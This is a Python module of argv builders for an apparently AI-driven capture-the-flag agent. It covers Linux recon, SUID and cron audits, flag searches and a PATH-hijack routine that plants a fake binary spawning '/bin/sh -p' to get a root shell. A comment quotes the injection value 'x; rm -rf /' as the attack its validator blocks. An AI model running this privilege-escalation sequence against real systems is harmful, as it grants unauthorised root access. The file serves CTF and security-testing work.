"""
agents/ctf/command_builders.py

Pure Python command builder functions for the CTF agent.

CONTRACT:
- Input: a validated Pydantic params model instance
- Output: List[List[str]]  — each inner list is one argv vector (shell=False safe)
- NEVER return shell strings, pipes, or redirections
- NEVER call the AI or do I/O
"""

import os
import re
import sys
from typing import List


def build_environment_recon_argv(params) -> List[List[str]]:
    """
    Battery of safe, read-only recon commands.
    Returns multiple argv vectors to run sequentially.
    """
    return [
        ["id"],
        ["whoami"],
        ["uname", "-a"],
        ["pwd"],
        ["ls", "-la"],
        ["hostname"],
        ["cat", "/etc/os-release"],
        ["cat", "/proc/version"],
    ]


# FIX (live WSL smoke test, 2026-11-13): a default search_path of "/" on an
# unscoped `find` traverses pseudo-filesystems (/proc, /sys) and, on WSL
# specifically, the slow DrvFs/9p Windows drive mounts under /mnt/* -- those
# aren't part of the actual local target's filesystem anyway, and sweeping
# them is what pushed suid_audit, find_writable, and flag_search all past
# their timeout_seconds on live runs. Shared by every full-filesystem `find`
# builder below.
_PRUNE_DIRS = ["/proc", "/sys", "/mnt"]


def _find_prefix_with_mount_pruning(search_path: str) -> List[str]:
    """
    Build the common `find <path> -xdev [(prune clauses) -prune -o]` prefix.
    -xdev keeps the search on the starting path's own filesystem (so it won't
    cross into /proc, /sys, or any separately-mounted /mnt/* drive), and the
    explicit prunes are a belt-and-suspenders guard for the case where
    search_path is itself something other than "/" but still happens to
    contain one of these mounts. Pruning is only added for the default "/"
    sweep -- a caller-scoped search_path is left alone.
    """
    argv = ["find", search_path, "-xdev"]
    if search_path == "/":
        prune_expr: List[str] = []
        for i, d in enumerate(_PRUNE_DIRS):
            if i > 0:
                prune_expr.append("-o")
            prune_expr += ["-path", d]
        argv += ["(", *prune_expr, ")", "-prune", "-o"]
    return argv


def build_suid_audit_argv(params) -> List[List[str]]:
    """Find SUID-set binaries under the given search path."""
    search_path = getattr(params, "search_path", "/")
    argv = _find_prefix_with_mount_pruning(search_path)
    argv += ["-perm", "-4000", "-type", "f", "-ls"]
    return [argv]


def build_strings_analysis_argv(params) -> List[List[str]]:
    """Run strings on a binary with specified minimum length."""
    binary_path = params.binary_path
    min_length = str(getattr(params, "min_length", 8))
    return [
        ["strings", "-n", min_length, binary_path]
    ]


def build_read_file_argv(params) -> List[List[str]]:
    """Read a file's contents."""
    return [
        ["cat", params.file_path]
    ]


# MED-5: safe-component patterns for path_hijack_validation's AI-supplied strings.
# fake_binary_name must be a bare filename (no '/', no '..') -- it is joined onto
# work_dir below, and without this check a value like "../../etc/cron.d/x" could
# escape work_dir entirely. work_dir / target_suid_binary are expected to be
# absolute paths, so '/' is allowed in those but shell metacharacters are not.
_SAFE_FILENAME_RE = re.compile(r"^[A-Za-z0-9_.-]+$")
_SAFE_ABS_PATH_RE = re.compile(r"^/[A-Za-z0-9_./-]*$")


def _validate_safe_component(value, pattern, field_name):
    if not value or ".." in value or not pattern.match(value):
        raise ValueError(
            f"path_hijack_validation: {field_name}={value!r} failed safety validation "
            f"(must match {pattern.pattern!r} and must not contain '..'). Refusing to "
            f"build a command from an unvalidated AI-supplied string."
        )
    return value


def build_path_hijack_argv(params) -> List[List[str]]:
    """
    Validate a PATH hijack: create a fake binary in work_dir that spawns a shell,
    then run the SUID target with PATH prepended.
    Returns sequential steps as separate argv vectors.

    MED-5 fix: the previous implementation interpolated AI-supplied
    fake_binary_name / work_dir / target_suid_binary directly into `bash -c "..."`
    strings -- the one place in the whole command-builder layer that bent the
    "never build shell strings, every argv element is a literal, untrusted input is
    never concatenated into a command line" contract every other builder in this
    codebase follows. A value such as fake_binary_name="x; rm -rf /" would have been
    executed as shell syntax, not treated as a literal filename.

    This version (a) validates each component against a strict allow-list before
    using it at all, and (b) never invokes a shell: the fake script is written via a
    `python -c` helper that receives the path only as an argv string (sys.argv[1]),
    never interpolated into source code, and the final PATH-prefixed invocation uses
    the real `env` binary (`env VAR=value cmd`, which is argv -- not shell -- syntax)
    instead of `bash -c "PATH=... cmd"`.
    """
    work_dir = _validate_safe_component(
        getattr(params, "work_dir", "/tmp") or "/tmp", _SAFE_ABS_PATH_RE, "work_dir"
    )
    fake_name = _validate_safe_component(
        params.fake_binary_name, _SAFE_FILENAME_RE, "fake_binary_name"
    )
    target = _validate_safe_component(
        params.target_suid_binary, _SAFE_ABS_PATH_RE, "target_suid_binary"
    )
    fake_path = f"{work_dir}/{fake_name}"

    write_fake_script = (
        "import sys, pathlib\n"
        "p = pathlib.Path(sys.argv[1])\n"
        "p.write_text('#!/bin/sh\\n/bin/sh -p\\n')\n"
    )
    current_path = os.environ.get("PATH", "")

    return [
        [sys.executable, "-c", write_fake_script, fake_path],
        ["chmod", "+x", fake_path],
        ["env", f"PATH={work_dir}:{current_path}", target],
    ]


def build_find_writable_argv(params) -> List[List[str]]:
    """Find world-writable paths of the specified type."""
    search_path = getattr(params, "search_path", "/")
    find_type = getattr(params, "find_type", "d")
    argv = _find_prefix_with_mount_pruning(search_path)
    argv += ["-type", find_type, "-perm", "-0002"]
    return [argv]


def build_kernel_exploit_check_argv(params) -> List[List[str]]:
    """Check kernel version and OS details for known vulnerabilities."""
    return [
        ["uname", "-r"],
        ["cat", "/etc/os-release"],
        ["cat", "/proc/version"],
        ["uname", "-a"],
    ]


def build_process_list_argv(params) -> List[List[str]]:
    """List running processes."""
    return [
        ["ps", "auxf"],
    ]


def build_cron_job_audit_argv(params) -> List[List[str]]:
    """Audit cron jobs and their writeable scripts."""
    return [
        ["cat", "/etc/crontab"],
        ["ls", "-la", "/etc/cron.d/"],
        ["ls", "-la", "/etc/cron.daily/"],
        ["ls", "-la", "/etc/cron.weekly/"],
        ["ls", "-la", "/var/spool/cron/"],
    ]


def build_flag_search_argv(params) -> List[List[str]]:
    """Search for flag files matching common CTF patterns."""
    pattern = getattr(params, "pattern", "flag*")
    search_path = getattr(params, "search_path", "/")
    argv1 = _find_prefix_with_mount_pruning(search_path)
    argv1 += ["-name", pattern, "-type", "f"]
    argv2 = _find_prefix_with_mount_pruning(search_path)
    argv2 += ["-name", "*.txt", "-type", "f"]
    return [argv1, argv2]
